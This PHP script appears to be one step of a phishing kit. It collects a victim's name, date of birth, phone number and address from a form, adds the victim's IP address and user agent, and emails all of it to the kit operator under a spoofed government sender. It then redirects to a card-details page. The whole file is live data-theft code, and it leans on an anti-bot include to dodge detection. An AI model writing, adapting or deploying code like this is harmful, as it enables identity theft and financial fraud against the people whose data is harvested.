<?php
	error_reporting(0);
	ob_start();
	session_start();

include'../antibots.php';
	include '../email.php';
if($_SERVER['REQUEST_METHOD'] == 'POST'){

		$_SESSION["PRENOM"]		= $_POST["prenom"];
		$_SESSION["NOM"]		= $_POST["nom"];
		$_SESSION["DOB"]		= $_POST["dob"];
		$_SESSION["PhoneNumber"]= $_POST["phone"];
		$_SESSION["street"] 	= $_POST["address1"];
		$_SESSION["VILLE"]		= $_POST["ville"];
		$_SESSION["CP"] 	= $_POST["cp"];

$message = '
🎂 Date De Naissance : '.$_SESSION["DOB"].'
👨 Prenom : '.$_SESSION["PRENOM"].'
👩 Nom : '.$_SESSION["NOM"].'
☎️ Telephone : '.$_SESSION["PhoneNumber"].'
🏠 Adresse : '.$_SESSION["street"].'
🏘️ Ville : '.$_SESSION["VILLE"].'
🏚️ Code postale : '.$_SESSION["VILLE"].'
📍 IP: '._ip().'
📱 User Agent: '.$_SERVER["HTTP_USER_AGENT"].'
';
$Subject=" INFO 🎰 |"._ip();
$head="From: 山本 💛 <sarah-info@skoogaas.gov>";


$_SESSION['step_three']  = true;
		mail($my_mail,$Subject,$message,$head);
		header('location: card.php?enc=' . md5(time()) . '&p=1&dispatch=' . sha1(time()));

}
else
{
	header('location: ../../index.php');
}
